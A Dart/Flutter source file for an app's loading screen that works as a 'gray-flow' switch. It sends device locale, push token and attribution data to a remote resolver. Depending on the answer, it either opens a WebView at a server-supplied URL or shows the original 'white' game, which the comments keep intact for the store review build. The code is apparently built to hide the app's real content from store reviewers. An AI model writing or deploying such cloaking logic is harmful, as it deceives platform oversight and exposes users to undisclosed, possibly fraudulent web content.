import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../core/attribution_beacon.dart';
import '../core/link_monitor.dart';
import '../core/route_resolver.dart';
import '../core/signal_dispatcher.dart';
import '../core/vault_store.dart';
import '../data/route_mode.dart';
import '../screens/splash_screen.dart' as white_splash;
import 'offline_view.dart';
import 'shell_view.dart' deferred as shell;
import 'signal_consent_view.dart';

// ─── IntroView ──────────────────────────────────────────────
// Gray-flow entry screen. Three jobs:
//
//   1. Render the project-specific gray loading background
//      plus a horizontal progress bar with "Loading…".
//   2. Run the state machine described in the rules doc:
//        pending  → first-launch route resolve
//        online   → returning WebView user
//        offline  → drop straight into the white game.
//   3. Push the next screen (ShellView, SignalConsentView,
//      OfflineView, or the white SplashScreen).
//
// The white-game fallback is the original SphinxFury splash —
// re-used verbatim so the game review build remains intact.
// ────────────────────────────────────────────────────────────

class IntroView extends StatefulWidget {
  final VaultStore vault;
  final LinkMonitor link;
  final AttributionBeacon beacon;
  final RouteResolver resolver;
  final SignalDispatcher signal;

  const IntroView({
    super.key,
    required this.vault,
    required this.link,
    required this.beacon,
    required this.resolver,
    required this.signal,
  });

  @override
  State<IntroView> createState() => _IntroViewState();
}

class _IntroViewState extends State<IntroView>
    with SingleTickerProviderStateMixin {
  double _bar = 0.0;
  int _dots = 0;
  Timer? _dotTimer;
  bool _hopped = false;

  @override
  void initState() {
    super.initState();
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    _dotTimer = Timer.periodic(const Duration(milliseconds: 500), (_) {
      if (mounted) setState(() => _dots = (_dots + 1) % 4);
    });
    _glide(0.05);
    unawaited(_orchestrate());
  }

  @override
  void dispose() {
    _dotTimer?.cancel();
    super.dispose();
  }

  // ── Progress glide helpers ────────────────────────────

  void _glide(double target) {
    if (!mounted) return;
    setState(() => _bar = target.clamp(0.0, 1.0));
  }

  Future<void> _fillToOne() async {
    _glide(1.0);
    await Future<void>.delayed(const Duration(milliseconds: 400));
  }

  // ── Main flow ─────────────────────────────────────────

  Future<void> _orchestrate() async {
    widget.signal.onTokenRotated = _onTokenRotated;
    await widget.signal.ignite().catchError((_) {});

    final mode = widget.vault.currentMode();

    switch (mode) {
      case RouteMode.online:
        _glide(0.30);
        await _runWarm();
        break;
      case RouteMode.offline:
        _glide(0.55);
        await _fillToOne();
        if (!mounted) return;
        _hopToWhite();
        break;
      case RouteMode.pending:
        await _runFirst();
        break;
    }
  }

  Future<void> _runFirst() async {
    _glide(0.10);
    final online = await widget.link.isOnline();
    if (!online) {
      if (!mounted) return;
      _hopToOffline();
      return;
    }

    _glide(0.35);
    await widget.beacon.ignite();
    await Future.wait([
      widget.beacon.waitAttribution(),
      widget.beacon.waitDeepLink(),
    ]);
    _glide(0.65);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.beacon.assembleBody(
      locale: locale,
      pushToken: widget.signal.token,
    );
    final verdict = await widget.resolver.probe(body);
    _glide(0.85);

    if (verdict.directsToWeb) {
      await widget.vault.commitMode(RouteMode.online);
      await _fillToOne();
      if (!mounted) return;
      _hopToShell(verdict.url!);
    } else {
      await widget.vault.commitMode(RouteMode.offline);
      await _fillToOne();
      if (!mounted) return;
      _hopToWhite();
    }
  }

  Future<void> _runWarm() async {
    final online = await widget.link.isOnline();
    if (!online) {
      await _fillToOne();
      if (!mounted) return;
      _hopToOffline();
      return;
    }

    final pushUrl = await widget.vault.drainPushUrl();
    if (pushUrl != null) {
      await _fillToOne();
      if (!mounted) return;
      _hopToShell(pushUrl);
      return;
    }

    final saved = await widget.resolver.recallUrl();

    await widget.beacon.ignite();
    await Future.wait([
      widget.beacon.waitAttribution(cap: const Duration(seconds: 10)),
      widget.beacon.waitDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.beacon.assembleBody(
      locale: locale,
      pushToken: widget.signal.token,
    );
    final verdict = await widget.resolver.probe(body);
    await _fillToOne();
    if (!mounted) return;

    if (verdict.directsToWeb) {
      _hopToShell(verdict.url!);
      return;
    }
    if (saved != null) {
      _hopToShell(saved);
      return;
    }
    _hopToOffline();
  }

  void _onTokenRotated(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.beacon.assembleBody(
      locale: locale,
      pushToken: token,
    );
    await widget.resolver.probe(body);
  }

  // ── Navigation hops ───────────────────────────────────

  Future<void> _hopToShell(String url) async {
    if (_hopped) return;
    _hopped = true;

    await shell.loadLibrary();
    await shell.primeShell();
    if (!mounted) return;

    if (widget.vault.shouldPromptForConsent()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => SignalConsentView(
            vault: widget.vault,
            signal: widget.signal,
            link: widget.link,
            contentUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => shell.ShellView(
            url: url,
            vault: widget.vault,
            signal: widget.signal,
            link: widget.link,
          ),
        ),
      );
    }
  }

  void _hopToOffline() {
    if (_hopped) return;
    _hopped = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineView(
          rebuild: (_) => IntroView(
            vault: widget.vault,
            link: widget.link,
            beacon: widget.beacon,
            resolver: widget.resolver,
            signal: widget.signal,
          ),
        ),
      ),
    );
  }

  void _hopToWhite() {
    if (_hopped) return;
    _hopped = true;
    // Restore portrait-only for the white game (per existing TZ).
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const white_splash.SplashScreen()),
    );
  }

  // ── UI ─────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: LayoutBuilder(
        builder: (context, c) {
          final landscape = c.maxWidth > c.maxHeight;
          final bg = landscape
              ? 'assets/Horizontal_LoadingScreen.webp'
              : 'assets/Vertical_LoadingScreen.webp';

          return Stack(
            fit: StackFit.expand,
            children: [
              Image.asset(bg, fit: BoxFit.cover),
              Container(color: Colors.black.withValues(alpha: 0.30)),
              Positioned(
                left: 0,
                right: 0,
                bottom: landscape ? 32 : 64,
                child: Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 42),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Text(
                        'Loading${'.' * _dots}',
                        style: const TextStyle(
                          color: Color(0xFFFFE3A1),
                          fontSize: 17,
                          fontWeight: FontWeight.w700,
                          letterSpacing: 2.5,
                          shadows: [
                            Shadow(
                              color: Colors.black,
                              blurRadius: 8,
                              offset: Offset(1, 1),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 12),
                      ClipRRect(
                        borderRadius: BorderRadius.circular(10),
                        child: TweenAnimationBuilder<double>(
                          tween: Tween(begin: 0, end: _bar),
                          duration: const Duration(milliseconds: 350),
                          curve: Curves.easeOut,
                          builder: (_, v, child) => LinearProgressIndicator(
                            value: v,
                            minHeight: 10,
                            backgroundColor: Colors.black.withValues(alpha: 0.55),
                            valueColor: const AlwaysStoppedAnimation<Color>(
                              Color(0xFFE6B547),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}
